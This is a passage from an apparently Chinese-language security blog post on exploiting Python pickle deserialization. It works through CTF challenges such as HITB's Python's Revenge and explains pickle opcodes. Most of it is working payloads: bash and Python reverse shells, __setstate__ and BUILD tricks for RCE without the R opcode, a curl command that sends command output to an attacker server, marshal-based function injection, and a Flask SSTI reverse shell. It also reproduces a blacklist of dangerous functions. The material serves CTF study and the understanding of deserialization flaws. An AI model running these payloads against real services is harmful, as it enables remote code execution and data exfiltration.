class="line">code.interact,code.compile_command,codeop.compile_command,</span><br><span class="line">pty.spawn,</span><br><span class="line">posixfile.<span class="built_in">open</span>,posixfile.fileopen,</span><br><span class="line">platform.popen</span><br></pre></td></tr></table></figure>
<p>除开我们常见的那些os库、subprocess库、commands库之外还有很多可以执行命令的函数，这里用举两个不常用的:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">map</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system,[<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#x27;</span>,])</span><br><span class="line"></span><br><span class="line">sys.call_tracing(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system,(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">platform.popen(<span class="string">&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>那么，如何过滤掉reduce呢？由于<code>__reduce__</code>方法对应的操作码是<code>R</code>，只需要<strong>把操作码<code>R</code>过滤掉</strong>就行了。这个可以很方便地利用<code>pickletools.genops</code>来实现。</p>
<p>如果reduce这一套手段被过滤，我们应该如何利用呢？以下就是本篇文章的正题。</p>
<h2 id="0x02-绕过函数黑名单：奇技淫巧">0x02 绕过函数黑名单：奇技淫巧</h2>
<p>有一种过滤方式：不禁止<code>R</code>指令码，但是对<code>R</code>执行的函数有黑名单限制。典型的例子是2018-XCTF-HITB-WEB : Python’s-Revenge。给了好长好长一串黑名单：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]</span><br></pre></td></tr></table></figure>
<p>可惜<code>platform.popen()</code>不在名单里，它可以做到类似<code>system</code>的功能。这题死于黑名单有漏网之鱼。</p>
<p>另外，还有一个解（估计是出题人的预期解），那就是利用map来干这件事：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Exploit(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line"> 	return map,(os.system,[&quot;ls&quot;])</span><br></pre></td></tr></table></figure>
<p>总之，黑名单不可取。要禁止reduce这一套方法，最稳妥的方式是禁止掉<code>R</code>这个指令码。</p>
<h2 id="0x03-全局变量包含：c指令码的妙用">0x03 全局变量包含：<code>c</code>指令码的妙用</h2>
<p>有这么一道题，彻底过滤了<code>R</code>指令码（写法是：只要见到payload里面有<code>R</code>这个字符，就直接驳回，简单粗暴）。现在的任务是：给出一个字符串，<strong>反序列化之后，name和grade需要与blue这个module里面的name、grade相对应</strong>。</p>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-b42656fa4b3c95eaee8c37dccacad636_720w.jpg" alt="img">目标是取得well done</p>
<p>不能用<code>R</code>指令码了，不过没关系。还记得我们的<code>c</code>指令码吗？它专门用来获取一个全局变量。我们先弄一个正常的Student来看看序列化之后的效果：</p>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-8b0cb8c071dadcde37abdce434a8f180_720w.jpg" alt="img"></p>
<p>如何用<code>c</code>指令来换掉这两个字符串呢？以name的为例，只需要把硬编码的<code>rxz</code>改成从<code>blue</code>引入的<code>name</code>，写成指令就是：<code>cblue\nname\n</code>。把用于编码<code>rxz</code>的<code>X\x03\x00\x00\x00rxz</code>替换成我们的这个global指令，来看看改造之后的效果：</p>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-2a5604887f01ef88aebf6409279e82a1_720w.jpg" alt="img">load一下，发现真的引入了blue里面的变量</p>
<p>把这个payload进行base64编码之后传进题目，得到well done。</p>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-d02aeb43085db59a6d4b41f88c5ea68e_720w.jpg" alt="img"></p>
<p>顺带一提，由于pickle导出的字符串里面有很多的不可见字符，所以一般都经过base64编码之后传输。</p>
<h2 id="0x04-绕过c指令module限制：先读入，再篡改">0x04 绕过<code>c</code>指令<code>module</code>限制：先读入，再篡改</h2>
<p>之前提到过，<code>c</code>指令（也就是GLOBAL指令）基于<code>find_class</code>这个方法， 然而<code>find_class</code>可以被出题人重写。如果出题人只允许<code>c</code>指令包含<code>__main__</code>这一个module，这道题又该如何解决呢？</p>
<p>通过GLOBAL指令引入的变量，可以看作是原变量的引用。我们在栈上修改它的值，会导致原变量也被修改！</p>
<p>有了这个知识作为前提，我们可以干这么一件事：</p>
<ul>
<li>通过<code>__main__.blue</code>引入这一个module，由于命名空间还在main内，故不会被拦截</li>
<li>把一个dict压进栈，内容是<code>&#123;'name': 'rua', 'grade': 'www'&#125;</code></li>
<li>执行BUILD指令，会导致改写 <code>__main__.blue.name</code>和 <code>__main__.blue.grade</code> ，至此<code>blue.name</code>和<code>blue.grade</code>已经被篡改成我们想要的内容</li>
<li>弹掉栈顶，现在栈变成空的</li>
<li>照抄正常的Student序列化之后的字符串，压入一个正常的Student对象，name和grade分别是’rua’和’www’</li>
</ul>
<p>由于栈顶是正常的Student对象，pickle.loads将会正常返回。到手的Student对象，<a target="_blank" rel="noopener" href="http://xn--namegradeblue-450uj96een3bdt1d9sxg.name">当然name和grade都与blue.name</a>、blue.grade对应了——我们刚刚亲手把blue篡改掉。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;\x80\x03c__main__\nblue\n&#125;(Vname\nVrua\nVgrade\nVwww\nub0c__main__\nStudent\n)\x81&#125;(X\x04\x00\x00\x00nameX\x03\x00\x00\x00ruaX\x05\x00\x00\x00gradeX\x03\x00\x00\x00wwwub.&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-be0b611551c62614ea92f06ffe234480_720w.jpg" alt="img">绿框区域完成了篡改</p>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-5d923ca1b18273daec2e8131b64b8721_720w.jpg" alt="img"></p>
<p>题目返回了well done，而且此时blue.grade已经变成www，可见我们真的篡改了blue.</p>
<h2 id="0x05-不用reduce，也能RCE">0x05 不用reduce，也能RCE</h2>
<p>之前谈到过，<code>__reduce__</code>与<code>R</code>指令是绑定的，禁止了<code>R</code>指令就禁止了<code>__reduce__</code> 方法。那么，在禁止<code>R</code>指令的情况下，我们还能RCE吗？这就是本文研究的重点。</p>
<p>现在的目标是，利用指令码，构造出任意命令执行。那么我们需要找到一个函数调用<code>fun(arg)</code>，其中<code>fun</code>和<code>arg</code>都必须可控。</p>
<p>审pickle源码，来看看BUILD指令（指令码为<code>b</code>）是如何工作的：</p>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-ae7ce8d82f16d90bda791e4bc5e06f1d_720w.jpg" alt="img">BUILD指令实现</p>
<p>这里的实现方式也就是上文的注所提到的：如果<code>inst</code>拥有<code>__setstate__</code>方法，则把<code>state</code>交给<code>__setstate__</code>方法来处理；否则的话，直接把<code>state</code>这个<code>dist</code>的内容，合并到<code>inst.__dict__ </code>里面。</p>
<p>它有什么安全隐患呢？我们来想想看：<code>Student</code>原先是没有<code>__setstate__</code>这个方法的。那么我们利用<code>&#123;'__setstate__': os.system&#125;</code>来BUILE这个对象，那么现在对象的<code>__setstate__</code>就变成了<code>os.system</code>；接下来利用<code>&quot;ls /&quot;</code>来再次BUILD这个对象，则会执行<code>setstate(&quot;ls /&quot;)</code> ，而此时<code>__setstate__</code>已经被我们设置为<code>os.system</code>，因此实现了RCE.</p>
<p>payload构造如下：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVls /\nb.&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-5f6f6661a916b296e3fac6fbed8427cc_720w.jpg" alt="img"></p>
<p>执行结果：</p>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-44a237be1ffe80cf2969d217831fe5dd_720w.jpg" alt="img"></p>
<p>成功RCE！接下来可以通过反弹shell来控制靶机了。</p>
<p>有一个可以改进的地方：这份payload由于没有返回一个Student，导致后面抛出异常。要让后面无异常也很简单：干完了恶意代码之后把栈弹到空，然后压一个正常Student进栈。payload构造如下：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVls /\nb0c__main__\nStudent\n)\x81&#125;(X\x04\x00\x00\x00nameX\x03\x00\x00\x00ruaX\x05\x00\x00\x00gradeX\x03\x00\x00\x00wwwub.&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-fd188e8d3e3f341d719019b7e869bf9d_720w.jpg" alt="img">绿色框内为恶意代码</p>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-d5b6e15f6b0506689952cf0e8f93691f_720w.jpg" alt="img"></p>
<p>没有抛出异常。</p>
<p><strong>至此，我们完成了不使用<code>R</code>指令、无副作用的RCE。Congratulations！</strong></p>
<h2 id="0x06-一些细节"><strong>0x06 一些细节</strong></h2>
<p><strong>一</strong>、**其他模块的load也可以触发pickle反序列化漏洞。**例如：<code>numpy.load()</code>先尝试以numpy自己的数据格式导入；如果失败，则尝试以pickle的格式导入。因此<code>numpy.load()</code>也可以触发pickle反序列化漏洞。</p>
<p>二、即使代码中没有<code>import os</code>，<strong>GLOBAL指令也可以自动导入<code>os.system</code></strong>。因此，不能认为“我不在代码里面导入os库，pickle反序列化的时候就不能执行os.system”。</p>
<p>三、**即使没有回显，也可以很方便地调试恶意代码。**只需要拥有一台公网服务器，执行<code>os.system('curl your_server/</code>ls / | base64<code>)</code>，然后查询您自己的服务器日志，就能看到结果。这是因为：以```引号包含的代码，在sh中会直接执行，返回其结果。</p>
<p>下面给出一个例子：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload  = b&#x27;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVcurl 47.***.***.105/`ls / | base64`\nb.&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-f60a5ad59d548b1ca78b839320318dfe_720w.jpg" alt="img">payload</p>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-377763e71f5d198566d7b40e418289f8_720w.jpg" alt="img">pickle.loads()效果</p>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/v2-0c450bc39b3ce69cdf14486ed14752c1_720w.jpg" alt="img"></p>
<p><code>pickle.loads()</code>时，<code>ls /</code>的结果被base64编码后发送给服务器（红框）；我们的服务器查看日志，就可以得到命令执行结果。因此，在没有回显的时候，我们可以通过<code>curl</code>把执行结果送到我们的服务器上。</p>
<p>上文发出去的请求缺了一段，是因为url没有加引号。</p>
<h2 id="0x07-input函数">0x07 input函数</h2>
<p>相信有童鞋已经敏锐的注意到了这个input函数，这个通常很难进入大家的视线。 这个函数也仅在python2中能够利用，在之前的博客<a target="_blank" rel="noopener" href="http://bendawang.site/2017/12/04/python%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-%E4%B8%89-%E4%BB%8E2%E5%88%B03/">python深入学习(三)：从py2到py3</a> 中提到过为什么。  这个函数在python2中是能够执行python代码的。但是有一个问题就是这个函数是从标准输入获取字符串，所以怎么利用就是一个问题，不过相信大家看到我 hook  pickle的load的方法就知道这里该怎么利用了，我们可以利用StringIO库，然后将标准输入修改为StringIO创建的内存缓冲区即可。  接下来，我们以在<code>hitb 2018</code>中的<code>python revenge</code>为例来说明怎么把这个函数用起来。 首先关于pickle 的数据流协议在python2里面有三种，python3里面有五种，默认的是0，具体可以看看勾陈安全实验室的<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/25981037">Python Pickle的任意代码执行漏洞实践和Payload构造</a>,其中对协议进行说明，这里搬运下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c：读取新的一行作为模块名module，读取下一行作为对象名object，然后将module.object压入到堆栈中。</span><br><span class="line">(：将一个标记对象插入到堆栈中。为了实现我们的目的，该指令会与t搭配使用，以产生一个元组。</span><br><span class="line">t：从堆栈中弹出对象，直到一个“(”被弹出，并创建一个包含弹出对象（除了“(”）的元组对象，并且这些对象的顺序必须跟它们压入堆栈时的顺序一致。然后，该元组被压入到堆栈中。</span><br><span class="line">S：读取引号中的字符串直到换行符处，然后将它压入堆栈。</span><br><span class="line">R：将一个元组和一个可调用对象弹出堆栈，然后以该元组作为参数调用该可调用的对象，最后将结果压入到堆栈中。</span><br><span class="line">.：结束pickle。</span><br></pre></td></tr></table></figure>
<p>好的我们来构造一下这个input函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c__builtin__</span><br><span class="line">input</span><br><span class="line">(S&#x27;input: &#x27;</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>
<p>然后我们要想办法修改一下标准输入，正常python2里面我们一般这样修改</p>
<p><a target="_blank" rel="noopener" href="http://www.bendawang.site/images/python_pickle.png"><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/python_pickle.png" alt="python_pickle"></a></p>
<p>但是在pickle的0号协议中，我们不能用等于符号，但是我们可以用<code>setattr</code>函数</p>
<p><a target="_blank" rel="noopener" href="http://www.bendawang.site/images/python_pickle2.png"><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/python_pickle2.png" alt="python_pickle2"></a></p>
<p>好的现在万事就绪了，只需要把这一套用上述协议转换一下就行了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">c__builtin__</span><br><span class="line">setattr</span><br><span class="line">(c__builtin__</span><br><span class="line">__import__</span><br><span class="line">(S&#x27;sys&#x27;</span><br><span class="line">tRS&#x27;stdin&#x27;</span><br><span class="line">cStringIO</span><br><span class="line">StringIO</span><br><span class="line">(S&#x27;__import__(&#x27;os&#x27;).system(\&#x27;curl 127.0.0.1:12345\&#x27;)&#x27;</span><br><span class="line">tRtRc__builtin__</span><br><span class="line">input</span><br><span class="line">(S&#x27;input: &#x27;</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>
<p>直接反弹shell就行了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&#x27;&#x27;&#x27;c__builtin__\nsetattr\n(c__builtin__\n__import__\n(S&#x27;sys&#x27;\ntRS&#x27;stdin&#x27;\ncStringIO\nStringIO\n(S&#x27;__import__(&#x27;os&#x27;).system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#x27;)&#x27;\ntRtRc__builtin__\ninput\n(S&#x27;python&gt; &#x27;\ntR.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pickle.loads(a)</span><br></pre></td></tr></table></figure>
<h2 id="0x08-任意函数构造">0x08 任意函数构造</h2>
<p>在勾陈安全实验室的文章中，提到了一个<code>types.FunctionType</code>配上<code>marshal.loads</code>的方法，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    os.system(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;&quot;&quot;ctypes</span></span><br><span class="line"><span class="string">FunctionType</span></span><br><span class="line"><span class="string">(cmarshal</span></span><br><span class="line"><span class="string">loads</span></span><br><span class="line"><span class="string">(cbase64</span></span><br><span class="line"><span class="string">b64decode</span></span><br><span class="line"><span class="string">(S&#x27;%s&#x27;</span></span><br><span class="line"><span class="string">tRtRc__builtin__</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS&#x27;&#x27;</span></span><br><span class="line"><span class="string">tR(tR.&quot;&quot;&quot;</span>%base64.b64encode(marshal.dumps(foo.func_code))</span><br><span class="line"></span><br><span class="line">pickle.loads(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;&quot;&quot;ctypes</span></span><br><span class="line"><span class="string">FunctionType</span></span><br><span class="line"><span class="string">(cmarshal</span></span><br><span class="line"><span class="string">loads</span></span><br><span class="line"><span class="string">(S&#x27;%s&#x27;</span></span><br><span class="line"><span class="string">tRc__builtin__</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS&#x27;&#x27;</span></span><br><span class="line"><span class="string">tR(tR.&quot;&quot;&quot;</span>%marshal.dumps(foo.func_code).encode(<span class="string">&#x27;string-escape&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pickle.loads(payload)</span><br></pre></td></tr></table></figure>
<p>这里不再赘述，同样的思路我们还有一些别的方法，例如和<code>types.FunctionType</code>几乎一样的函数<code>new.function</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    os.system(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;&quot;&quot;cnew</span></span><br><span class="line"><span class="string">function</span></span><br><span class="line"><span class="string">(cmarshal</span></span><br><span class="line"><span class="string">loads</span></span><br><span class="line"><span class="string">(cbase64</span></span><br><span class="line"><span class="string">b64decode</span></span><br><span class="line"><span class="string">(S&#x27;%s&#x27;</span></span><br><span class="line"><span class="string">tRtRc__builtin__</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS&#x27;&#x27;</span></span><br><span class="line"><span class="string">tR(tR.&quot;&quot;&quot;</span>%base64.b64encode(marshal.dumps(foo.func_code))</span><br><span class="line"></span><br><span class="line">pickle.loads(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;&quot;&quot;cnew</span></span><br><span class="line"><span class="string">function</span></span><br><span class="line"><span class="string">(cmarshal</span></span><br><span class="line"><span class="string">loads</span></span><br><span class="line"><span class="string">(S&#x27;%s&#x27;</span></span><br><span class="line"><span class="string">tRc__builtin__</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS&#x27;&#x27;</span></span><br><span class="line"><span class="string">tR(tR.&quot;&quot;&quot;</span>%marshal.dumps(foo.func_code).encode(<span class="string">&#x27;string-escape&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pickle.loads(payload)</span><br></pre></td></tr></table></figure>
<h2 id="0x09-类函数构造">0x09 类函数构造</h2>
<p>这里主要使用<code>new.classobj</code>函数来构造一个类函数对象然后执行，这样就可以调用原有库的一些函数，也可以自己构造。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=pickle.dumps(new.classobj(<span class="string">&#x27;system&#x27;</span>, (), &#123;<span class="string">&#x27;__getinitargs__&#x27;</span>:<span class="keyword">lambda</span> <span class="variable language_">self</span>,arg=(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#x27;</span>,):arg, <span class="string">&#x27;__module__&#x27;</span>: <span class="string">&#x27;os&#x27;</span>&#125;)())</span><br><span class="line"></span><br><span class="line">pickle.loads(payload)</span><br></pre></td></tr></table></figure>
<p>lambda语句也可以换成上述提到的<code>new.function</code>或是<code>types.FunctionType</code>的构造。</p>
<p>既然有了这种思路，那么<code>new</code>库里面的提到的很多东西都可以转换思路了。有兴趣可以去研究一下</p>
<h2 id="0x10-构造SSTI">0x10 构造SSTI</h2>
<p>本来这是一个打算用于以后的一个点的，但是这次有人用这种方法做出来了，那我也就分享一下了。说道要找执行代码的函数，不久前的qwb和hitb我都特意采用了Flask框架。而要知道Flask的<code>render_template_string</code>所引发的SSTI漏洞则又是另一个可利用的点了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;cflask.templating\nrender_template_string\np0\n(S\&quot;&#123;% for x in (().__class__.__base__.__subclasses__()) %&#125;&#123;%if x.__name__ ==&#x27;catch_warnings&#x27;%&#125;&#123;&#123;x.__repr__.im_func.func_globals.linecache.os.system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/172.17.0.1/12345 0&gt;&amp;1\&quot; &amp;&#x27;)&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125;\&quot;\np1\ntp2\nRp3\n.&quot;</span></span><br></pre></td></tr></table></figure>
<p>​</p>
<h1>快速回顾</h1>
<p>pickle实际上是一门栈语言，他有不同的几种编写方式，通常我们人工编写的话，是使用protocol=0的方式来写。而读取的时候python会自动识别传入的数据使用哪种方式，下文内容也只涉及protocol=0的方式。</p>
<p>和传统语言中有变量、函数等内容不同，pickle这种堆栈语言，并没有“变量名”这个概念，所以可能有点难以理解。pickle的内容存储在如下两个位置中：</p>
<ul>
<li>stack 栈</li>
<li>memo 一个列表，可以存储信息</li>
</ul>
<p>我们还是以最常用的那个payload来看起，首先将payload <code>b'cposix\nsystem\np0\n(Vtouch /tmp/success\np1\ntp2\nRp3\n.'</code> 写进一个文件，然后使用如下命令对其进行分析：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pickletools pickle</span><br></pre></td></tr></table></figure>
<p>可见，其实输出的是一堆OPCODE：</p>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/6aa8929cfcdccbd2e9594c156708e376" alt="Code-Breaking中的两个Python沙箱"></p>
<p>protocol 0的OPCODE是一些可见字符，比如上图中的 <code>c</code> 、 <code>p</code> 、 <code>(</code> 等。</p>
<p>我们在Python源码中可以看到所有opcode(所有的放在文末)：</p>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/0a64d18b56e4e9da047bd82d46be7bca" alt="Code-Breaking中的两个Python沙箱"></p>
<p>上面例子中涉及的OPCODE我做下解释：</p>
<ul>
<li><code>c</code> ：引入模块和对象，模块名和对象名以换行符分割。（ <code>find_class</code> 校验就在这一步，也就是说，只要c这个OPCODE的参数没有被 <code>find_class</code> 限制，其他地方获取的对象就不会被沙盒影响了，这也是我为什么要用getattr来获取对象）</li>
<li><code>(</code> ：压入一个标志到栈中，表示元组的开始位置</li>
<li><code>t</code> ：从栈顶开始，找到最上面的一个 <code>(</code> ，并将 <code>(</code> 到 <code>t</code> 中间的内容全部弹出，组成一个元组，再把这个元组压入栈中</li>
<li><code>R</code> ：从栈顶弹出一个可执行对象和一个元组，元组作为函数的参数列表执行，并将返回值压入栈上</li>
<li><code>p</code> ：将栈顶的元素存储到memo中，p后面跟一个数字，就是表示这个元素在memo中的索引</li>
<li><code>V</code> 、 <code>S</code> ：向栈顶压入一个（unicode）字符串</li>
<li><code>.</code> ：表示整个程序结束</li>
</ul>
<p>知道了这些OPCODE，我们很容易就翻译出 <code>__reduce__</code> 生成的这段pickle代码是什么意思了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0: c    GLOBAL     &#x27;posix system&#x27; # 向栈顶压入`posix.system`这个可执行对象</span><br><span class="line">14: p    PUT        0 # 将这个对象存储到memo的第0个位置</span><br><span class="line">17: (    MARK # 压入一个元组的开始标志</span><br><span class="line">18: V        UNICODE    &#x27;touch /tmp/success&#x27; # 压入一个字符串</span><br><span class="line">38: p        PUT        1 # 将这个字符串存储到memo的第1个位置</span><br><span class="line">41: t        TUPLE      (MARK at 17) # 将由刚压入栈中的元素弹出，再将由这个元素组成的元组压入栈中</span><br><span class="line">42: p    PUT        2 # 将这个元组存储到memo的第2个位置</span><br><span class="line">45: R    REDUCE # 从栈上弹出两个元素，分别是可执行对象和元组，并执行，结果压入栈中</span><br><span class="line">46: p    PUT        3 # 将栈顶的元素（也就是刚才执行的结果）存储到memo的第3个位置</span><br><span class="line">49: .    STOP # 结束整个程序</span><br></pre></td></tr></table></figure>
<p>显然，这里的memo是没有起到任何作用的。所以，我们可以将这段代码进一步简化，去除存储memo的过程：</p>
